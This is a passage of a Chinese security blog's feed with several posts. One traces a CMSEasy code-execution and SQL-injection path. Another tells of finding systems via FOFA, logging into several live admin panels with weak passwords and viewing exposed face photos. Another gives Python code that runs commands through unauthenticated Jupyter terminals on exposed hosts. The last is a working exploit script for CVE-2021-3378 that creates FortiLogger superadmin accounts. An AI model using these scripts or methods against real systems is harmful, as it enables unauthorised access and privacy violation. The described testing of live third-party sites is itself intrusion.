<p>daddslashes()函数作为过滤函数，将输入的参数实体化</p>
<pre><code class="language-php">if (!function_exists('daddslashes')) {
    function daddslashes($string, $force = 1)
    {
        if (is_array($string)) {
            $keys = array_keys($string);
            foreach ($keys as $key) {
                $val = $string[$key];
                unset($string[$key]);
                $string[addslashes($key)] = daddslashes($val, $force);
            }
        }
        else {
            $string = htmlspecialchars(addslashes(trim($string)), ENT_QUOTES);
            if (!front::$isadmin || (front::$case == 'admin' &amp;&amp; front::$act == 'login')) {
                front::check_type($string, 'safe');
                if (inject_check($string)) {
                    //var_dump($string);
                    event::log('inject', $string);
                    echo $string;exit;

                }

            }
            if (preg_match('/^data:(.*?)/is', $string)) {
                exit('data:');
            }
        }
        return $string;
    }
</code></pre>
<p>此时传入的<code>&lt;?php phpinfo();?&gt;</code>已经变成<code>&lt;?php phpinfo();?&gt;</code><br>
接下来在index.php中调用dispatch()方法</p>
<pre><code class="language-php"> function dispatch()
    {
        $case = self::$case . (self::$admin &amp;&amp; self::$case &lt;&gt; 'admin' &amp;&amp; self::$case &lt;&gt; 'install' ? '_admin' : '_act');
        if (!class_exists($case)) {
            throw new HttpErrorException(404, lang('page_does_not_exist'), 404);
        } else {
            $method = self::$act . '_action';
            $case = new $case();
            $case-&gt;init();
            if (method_exists($case, $method))
                $case-&gt;$method();
            else
                throw new HttpErrorException(404, lang('page_does_not_exist'), 404);
            $case-&gt;end();
            //var_dump(get_class($case));
            if (get_class($case) != 'install_act' &amp;&amp; get_class($case) != 'crontab_act') {

                if(config::get('site_push')) {
                    $last = @file_get_contents(ROOT . '/cache/data/xiongzhang.log');
                    if(!$last || $last &lt; date('Y-m-d')){
                        $site = getSiteUrl() . '/index.php?case=crontab&amp;act=xiongzhang';
                        $site .= &quot;&amp;token=&quot;.config::get('cookie_password');
                        _sock($site);
                    }
                }
                //var_dump($site);
                $this-&gt;autocleanstats();//自动清楚蜘蛛记录
                $this-&gt;autobakdatabase();//自动备份数据库
                $this-&gt;doarchivetimeout();//处理过期新闻
                $this-&gt;autocreatehtml();//自动生成HTML
                $this-&gt;automap(); //自动生成百度谷歌地图
            }
        }
    }
</code></pre>
<p>可以观察到$case实例化后，method_exists判断有无传入的方法，然后直接执行该方法</p>
<p>这里传递参数为<strong>act=add</strong></p>
<figure data-type="image" tabindex="8"><img src="https://z3.ax1x.com/2021/09/22/4N74Bj.png" alt="4N74Bj.png" loading="lazy"></figure>
<p>所以应该执行<strong>add_action</strong>函数。</p>
<p>进入函数内部后发现<strong>add_action</strong>函数内使用save_before函数对fron::$get参数进行处理</p>
<figure data-type="image" tabindex="9"><img src="https://z3.ax1x.com/2021/09/22/4N7740.png" alt="4N7740.png" loading="lazy"></figure>
<p>而save_before也就是造成这个漏洞的最终原因之一，很神奇的他又把实例化的字符解码回去了。</p>
<p>突出两个字</p>
<p><strong>神奇</strong></p>
<figure data-type="image" tabindex="10"><img src="https://z3.ax1x.com/2021/09/22/4N7OvF.png" alt="4N7OvF.png" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://z3.ax1x.com/2021/09/22/4N7LgU.png" alt="4N7LgU.png" loading="lazy"></figure>
<p>剩下的就是在add_action中调用插入数据库操作，一路跟跟跟跟，跟到最后的sql_insert发现使用**.=**连接参数</p>
<figure data-type="image" tabindex="12"><img src="https://z3.ax1x.com/2021/09/22/4N7bCV.png" alt="4N7bCV.png" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://z3.ax1x.com/2021/09/22/4N7q3T.png" alt="4N7q3T.png" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://z3.ax1x.com/2021/09/22/4N7xb9.png" alt="4N7xb9.png" loading="lazy"></figure>
<hr>
<p>除了这个点之外，edit_action也用到savebefore。所以只要路由中带有<strong>act=edit</strong>和<strong>act=add</strong>的参数的都存在代码执行漏洞</p>
<h1 id="0x04-sql你为什么报错">0x04 SQL,你为什么报错!</h1>
<p>POC:</p>
<pre><code class="language-sql">/index.php?case=table&amp;act=edit&amp;table=archive&amp;catid=16&amp;admin_dir=admin&amp;site=default&amp;username=&amp;url=&amp;isvisual=&amp;aid=&amp;dfile=&amp;page=1&amp;id=999
</code></pre>
<p>注入点 在id=999</p>
<p>内置过滤，暂时无法利用</p>
<figure data-type="image" tabindex="15"><img src="https://z3.ax1x.com/2021/09/22/4N7GA1.png" alt="4N7GA1.png" loading="lazy"></figure>
<p>首先打印所有sql语句</p>
<figure data-type="image" tabindex="16"><img src="https://z3.ax1x.com/2021/09/22/4N7Jtx.png" alt="4N7Jtx.png" loading="lazy"></figure>
<p>观察到报错点</p>
<figure data-type="image" tabindex="17"><img src="https://z3.ax1x.com/2021/09/22/4N7acD.png" alt="4N7acD.png" loading="lazy"></figure>
<p>报错的原因在于catid为空</p>
<figure data-type="image" tabindex="18"><img src="https://z3.ax1x.com/2021/09/22/4N7Yh6.png" alt="4N7Yh6.png" loading="lazy"></figure>
<p>aid=999时查询到结果为空</p>
<figure data-type="image" tabindex="19"><img src="https://z3.ax1x.com/2021/09/22/4N7N9K.png" alt="4N7N9K.png" loading="lazy"></figure>
<p>实际上在执行</p>
<pre><code class="language-sql">SELECT *,my_field,my_tagone,my_shopping_model,my_shopping_color FROM `cmseasy_archive`  WHERE `aid`='999' and (state IS NULL or state&lt;&gt;'-1')  ORDER BY 1 desc LIMIT 1;
</code></pre>
<p>后直接取值获取catid的值</p>
<figure data-type="image" tabindex="20"><img src="https://z3.ax1x.com/2021/09/22/4N7U1O.png" alt="4N7U1O.png" loading="lazy"></figure>
<p>但是cms中内置了过滤，且对URL中的特殊符号做了处理，无法绕过。</p>
<figure data-type="image" tabindex="21"><img src="https://z3.ax1x.com/2021/09/22/4N70nH.png" alt="4N70nH.png" loading="lazy"></figure>
<p>所以虽然存在注入点但是无法利用........................</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从漏洞预警到POC实现]]></title>
        <id>https://ja9er.github.io/post/cong-lou-dong-yu-jing-dao-poc-shi-xian/</id>
        <link href="https://ja9er.github.io/post/cong-lou-dong-yu-jing-dao-poc-shi-xian/">
        </link>
        <updated>2021-08-12T10:03:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="从漏洞预警到poc实现">从漏洞预警到POC实现</h1>
<h2 id="0x01-人生是一个摆满餐具的茶几">0X01 人生是一个摆满餐具的茶几</h2>
<p>2021年7月13日网信办发文。9月1日落地</p>
<blockquote>
<p>1、不得发布或者提供专门用于利用网络产品安全漏洞从事危害网络安全活动的程序和工具。</p>
<p>2、在国家举办重大活动期间，未经公安部同意，不得擅自发布网络产品安全漏洞信息。</p>
<p>3、不得将未公开的网络产品安全漏洞信息向网络产品提供者之外的境外组织或者个人提供。</p>
</blockquote>
<p>总结来说就是不要乱发漏洞EXP和POC，网上的文库和师傅一夜之间跑路大半。属于是脚本小子の大末日了。</p>
<p>那么，作为一个菜鸡，要怎么在茫茫网海中扩充自己的武器库呢</p>
<h2 id="0x02-简单讲讲一个思路">0X02 简单讲讲一个思路</h2>
<p><strong>CNVD,WangAn等漏洞平台</strong></p>
<p>这些平台都会预警某某系统存在某某漏洞，仔细找找就能发现惊喜<br>
<a href="https://imgtu.com/i/f0SrTS"><img src="https://z3.ax1x.com/2021/08/12/f0SrTS.png" alt="f0SrTS.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/f0S6YQ"><img src="https://z3.ax1x.com/2021/08/12/f0S6YQ.png" alt="f0S6YQ.png" loading="lazy"></a></p>
<h2 id="0x03-简单的实现">0X03 简单的实现</h2>
<p>这里我们随便点一个进去，可以看到是一个未授权访问的漏洞，并且影响产品给出了一个很详细信息<br>
<a href="https://imgtu.com/i/f0SDw8"><img src="https://z3.ax1x.com/2021/08/12/f0SDw8.png" alt="f0SDw8.png" loading="lazy"></a><br>
接下来就是想想怎么复现它了，首先搜了搜同系统的名字发现还有弱口令<br>
<a href="https://imgtu.com/i/f0SBef"><img src="https://z3.ax1x.com/2021/08/12/f0SBef.png" alt="f0SBef.png" loading="lazy"></a><br>
这波啊，这波是稳稳地幸福！我们直接fofa见好伐。</p>
<blockquote>
<p>FOFA 是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。<br>
简单理解就是，一个本土加强版shodan，知道某产品在互联网的部署情况、获取一个根域名所有子域名网站、根据IP确认企业、根据一个子域名网站找到跟他在一个IP的其他网站、全网漏洞扫描、一个新的漏洞全网的影响范围。</p>
</blockquote>
<p>简单来说，fofa就是一个IP PLUS+++版本的谷歌。我们可以利用它寻找到具有相同网页结构特征的网站，也就是我们可以构造指纹来发现相同的系统。</p>
<p>首先建议使用<code>body=&quot;xxxxx系统&quot;</code>或者<code>title=&quot;xxx系统&quot;</code>来找到目标系统，然后观察该网站的结构细化指纹进而获取到全网的站点</p>
<p>搜索结果如下<br>
<a href="https://imgtu.com/i/f0SyFg"><img src="https://z3.ax1x.com/2021/08/12/f0SyFg.png" alt="f0SyFg.png" loading="lazy"></a><br>
随便找个站点点进去，观察一下网页结构，我们继续细化指纹<br>
<a href="https://imgtu.com/i/f0ScWj"><img src="https://z3.ax1x.com/2021/08/12/f0ScWj.png" alt="f0ScWj.png" loading="lazy"></a><br>
然后尝试弱口令登录，试了几个站进了后台<br>
<a href="https://imgtu.com/i/f0S2Ss"><img src="https://z3.ax1x.com/2021/08/12/f0S2Ss.png" alt="f0S2Ss.png" loading="lazy"></a><br>
这时候回到刚开始的漏洞预警，<code>未授权访问获取敏感信息</code>，就往这个方向进行黑盒测试</p>
<p>抓包测试发现还是有session验证的<br>
<a href="https://imgtu.com/i/f0SRln"><img src="https://z3.ax1x.com/2021/08/12/f0SRln.png" alt="f0SRln.png" loading="lazy"></a><br>
不过发现一个点具有导出功能，导出的文件保存在网站的路径下<br>
<a href="https://imgtu.com/i/f0SfO0"><img src="https://z3.ax1x.com/2021/08/12/f0SfO0.png" alt="f0SfO0.png" loading="lazy"></a><br>
这时候直接访问该路径，发现可以访问，然后回退目录顺利的发现了一个列目录漏洞<br>
<a href="https://imgtu.com/i/f0SWyq"><img src="https://z3.ax1x.com/2021/08/12/f0SWyq.png" alt="f0SWyq.png" loading="lazy"></a><br>
photo路径下存在大量的人脸照片，清除cookie测试是否存在未授权<br>
<a href="https://imgtu.com/i/f0S4mV"><img src="https://z3.ax1x.com/2021/08/12/f0S4mV.png" alt="f0S4mV.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/f0S5wT"><img src="https://z3.ax1x.com/2021/08/12/f0S5wT.png" alt="f0S5wT.png" loading="lazy"></a></p>
<h2 id="0x04-poc">0x04 POC</h2>
<p>如果自己没有开发扫描器的话，建议还是按照POCSUITE3格式写</p>
<p>Github 地址 : https://github.com/knownsec/pocsuite3</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[一次从未授权开始的研究]]></title>
        <id>https://ja9er.github.io/post/yi-ci-cong-wei-shou-quan-kai-shi-de-yan-jiu/</id>
        <link href="https://ja9er.github.io/post/yi-ci-cong-wei-shou-quan-kai-shi-de-yan-jiu/">
        </link>
        <updated>2021-07-06T10:02:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-开始">0x01 开始</h1>
<p>摸鱼看到文章</p>
<blockquote>
<p>Jupyter-Notebook是基于网页的用于交互计算的应用程序。其可被应用于全过程计算：开发、文档编写、运行代码和展示结果。——<a href="https://link.jianshu.com/?t=https%3A%2F%2Fjupyter-notebook.readthedocs.io%2Fen%2Fstable%2Fnotebook.html">Jupyter Notebook官方介绍</a></p>
</blockquote>
<p>简而言之，Jupyter Notebook是以网页的形式打开，可以在网页页面中<strong>直接</strong>编写代码和运行代码，代码的运行结果也会直接在代码块下显示。</p>
<blockquote>
<p>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
</blockquote>
<p>随便找找，好家伙这么多<br>
<a href="https://imgtu.com/i/R7URb9"><img src="https://z3.ax1x.com/2021/07/06/R7URb9.md.png" alt="R7URb9.md.png" loading="lazy"></a></p>
<h1 id="0x02-复现以及一点小研究">0x02 复现，以及一点小研究</h1>
<p>找一个站点，所谓的未授权，大大的Terminal非常动人<br>
<a href="https://imgtu.com/i/R7U7vD"><img src="https://z3.ax1x.com/2021/07/06/R7U7vD.md.png" alt="R7U7vD.md.png" loading="lazy"></a><br>
查看权限，root。按理来说这次简单的复现到此为止，但是今天比较好奇，因为一直以来有个疑问，阿里云这类网页实现的console是怎么和服务器交互的。<br>
<a href="https://imgtu.com/i/R7U2DJ"><img src="https://z3.ax1x.com/2021/07/06/R7U2DJ.md.png" alt="R7U2DJ.md.png" loading="lazy"></a><br>
刚开始习惯性的开了Burp抓抓包，不过没办法加载出console界面，看来不是走的HTTP协议。打开wireshark跟踪流看看，可以看到返回包的标志是[&quot;stdout&quot;,&quot; &quot;],输入什么，响应什么，外加输入的结果一并返回<br>
<a href="https://imgtu.com/i/R7UqDH"><img src="https://z3.ax1x.com/2021/07/06/R7UqDH.md.png" alt="R7UqDH.md.png" loading="lazy"></a><br>
单输入一个l测试，注意这里并没有回车<br>
<a href="https://imgtu.com/i/R7UbKe"><img src="https://z3.ax1x.com/2021/07/06/R7UbKe.md.png" alt="R7UbKe.md.png" loading="lazy"></a><br>
知道是怎么获取结果的了，但是还是不清楚这里的输入是怎么发出去的。因为之前上burp没加载到网页，猜测和JS有关。于是翻了翻JS文件，果然找到一个terminado.js。一看代码就特别清楚了，妥妥的websocket标准用法。函数make_terminal的两个参数，element和ws_url。element用于生成节点，ws_url使用时传入的实参是由另一个config.js中配置的websocket 的url</p>
<pre><code class="language-python">define ('terminal/js/terminado',[&quot;xterm&quot;, &quot;xtermjs-fit&quot;], function(Terminal, fit) {
    &quot;use strict&quot;;
    function make_terminal(element, ws_url) {
        
        var ws = new WebSocket(ws_url);
        Terminal.applyAddon(fit);
        var term = new Terminal();
        ws.onopen = function(event) {
            term.on('data', function(data) {
                ws.send(JSON.stringify(['stdin', data]));
            });
            
            term.on('title', function(title) {
                document.title = title;
            });
            
            term.open(element);
            term.fit();
            // send the terminal size to the server.
            ws.send(JSON.stringify([&quot;set_size&quot;, term.rows, term.cols,
                                        window.innerHeight, window.innerWidth]));

            ws.onmessage = function(event) {
                var json_msg = JSON.parse(event.data);
                switch(json_msg[0]) {
                    case &quot;stdout&quot;:
                        term.write(json_msg[1]);
                        break;
                    case &quot;disconnect&quot;:
                        term.write(&quot;\r\n\r\n[CLOSED]\r\n&quot;);
                        break;
                }
            };
        };
        return {socket: ws, term: term};
    }

    return {make_terminal: make_terminal};
});


</code></pre>
<p>这其中 <code>ws.send(JSON.stringify(['stdin', data]));</code>传递输入的消息,<code>ws.onmessage</code>获取websocket端返回的消息。我们可以打个断点看看。</p>
<p>首先按下回车<br>
<a href="https://imgtu.com/i/R7UfER"><img src="https://z3.ax1x.com/2021/07/06/R7UfER.png" alt="R7UfER.png" loading="lazy"></a></p>
<p>控制台打出来，看看ws 到底send了个啥玩意儿。<br>
<a href="https://imgtu.com/i/R7UhU1"><img src="https://z3.ax1x.com/2021/07/06/R7UhU1.png" alt="R7UhU1.png" loading="lazy"></a></p>
<p>&quot;\\r&quot;,回车的转义符号。看起来&quot;[&quot;stdin&quot;,&quot;\r&quot;]&quot;就是send到server端的奥秘。此时，一个大胆且完整的想法已经回荡在我的脑海里了，只差最后一个拼图。写作也讲究人物地点时间三要素，显然，send，你也要有个send出去的地址，这就是websocket的server端。</p>
<p>在之前的js中有这么一段<code>var ws = new WebSocket(ws_url);</code>，很显然这就是我们要追寻的答案</p>
<pre><code class="language-python">ws://ip:port/terminals/websocket/5 #server端地址
</code></pre>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/R7U44x"><img src="https://z3.ax1x.com/2021/07/06/R7U44x.png" alt="R7U44x.png" loading="lazy"></a></figure>
<h1 id="0x03-python实现命令执行">0x03 Python实现命令执行</h1>
<p>最后，用python实现简单的控制,这段代码还是有bug的。后面再改吧，同步问题实在太坑了</p>
<pre><code class="language-python">from websocket import create_connection
cmd=&quot;whoami&quot;
target = 'ws://IP:PORT/terminals/websocket/4'
ws = create_connection(target)
ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))
lists=[]
for i in range(0,4):
    res = ws.recv()
    lists.append(res)
key=-1
for index,j in enumerate(lists):
    if cmd in j:
        key=index
        break
print lists[key+1]
</code></pre>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/R7UIC6"><img src="https://z3.ax1x.com/2021/07/06/R7UIC6.png" alt="R7UIC6.png" loading="lazy"></a></figure>
<hr>
<p>修改后的代码，基本可控了</p>
<pre><code class="language-python">from websocket import create_connection
result=&quot;&quot;
cmd=&quot;whoami&quot;
target = 'ws://IP:PORT/terminals/websocket/4'
ws = create_connection(target)

ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))

def get_list(NUM):
    lists=[]
    for i in range(0, NUM):
        res = ws.recv()
        lists.append(res)
    return lists

def find_result(lists):
    key = -1
    for index, j in enumerate(lists):
        if cmd in j:
            key = index
            break
    return key

while True:
    try:
        list = get_list(4)
        key = find_result(list)
        if key &gt;= 0:
            if key + 1 &gt; 3:
                list = get_list(1)
                result = list[0]
                break
            else:
                result = list[key + 1]
                break
    except Exception as e:
        break


print result


</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[(CVE-2021-3378) FortiLogger 任意用户创建 POC]]></title>
        <id>https://ja9er.github.io/post/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/</id>
        <link href="https://ja9er.github.io/post/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/">
        </link>
        <updated>2021-07-05T13:01:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="之前写的小玩意儿-放出来康康">之前写的小玩意儿。放出来康康</h1>
<blockquote>
<p>RZK Fortilogger是土耳其RZK公司的一个可为Windows系统上FortiGate防火墙进行即时状态跟踪，日志记录，搜索/过滤，报告和热点等功能的建站系统。</p>
</blockquote>
<p>FortiLogger 4.4.2.2 存在安全漏洞，该漏洞源于受任意文件上传的影响。<br>
很简单，就是接口未授权的问题，同理还有任意文件上传。</p>
<p>存储用户的接口</p>
<blockquote>
<p>/User/saveUser</p>
</blockquote>
<p>payload中的superadmin_profile，也就是管理员凭证，可以在接口</p>
<blockquote>
<p>/User/getProfile</p>
</blockquote>
<p>中查看，只需要把payload换成</p>
<blockquote>
<p>{<br>
'id':'all',<br>
}</p>
</blockquote>
<p>直接上脚本</p>
<pre><code class="language-python"># -*- coding: UTF-8 -*-
# !/usr/bin/python

import urllib3, argparse,json
import requests, sys, random

reload(sys)
sys.setdefaultencoding('utf8')
urllib3.disable_warnings()


def randomrequest():
    all_char = '0123456789qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJIKOLP'
    index = len(all_char)
    passward = ''
    for _ in range(4):
        n = random.randint(0, index - 1)
        passward += all_char[n]
    return passward


def poc(args):
    result = {'match': False, 'comment': '不存在此漏洞', 'others': {}}
    headers = {
        'Content-type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest'
    }
    headers2 = {
        # &quot;Host&quot;: &quot;%s:%s&quot; % (target, port,),
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36&quot;,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'close',
    }
    rand = randomrequest()
    payload = '''{
              '_profilename':'superadmin_profile', 
              '_username': \'''' + rand + '''\', 
              '_password': 'test', 
              '_fullname':'', 
              '_email':''
              }'''
    data2 = &quot; &quot;

    url = str(args)
    try:
        req1 = requests.post(url + '/User/saveUser', headers=headers, verify=False, timeout=20, data=payload, )
        if req1.status_code == 200 and &quot;false&quot; in req1.text:
            req2 = requests.post(url + '/User/getUsers', headers=headers2, verify=False, timeout=20, data=data2, )
            if req2.status_code == 200 and rand in req2.text:
                result['match'] = True
                result['comment'] = 'user create:  ' + rand + ' ,password: test '
                return result
    except Exception, e:
        result['comment'] = e
        return result

    return result


if __name__ == &quot;__main__&quot;:
    result = {'match': False, 'comment': 'Not vulnerable', 'others': {}}
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', default='http://192.168.1.1:5000', help=&quot;input url like [url=http://192.168.1.1:5000]http://192.168.1.1:5000[/url]&quot;)
    args = parser.parse_args()
    result = poc(args.url)
    print json.dumps(result['comment'])
</code></pre>
<p>验证截图<br>
<a href="https://imgtu.com/i/R5LQKg"><img src="https://z3.ax1x.com/2021/07/05/R5LQKg.md.png" alt="R5LQKg.md.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/R5LlrQ"><img src="https://z3.ax1x.com/2021/07/05/R5LlrQ.md.png" alt="R5LlrQ.md.png" loading="lazy"></a></p>
]]></content>
    </entry>
</feed>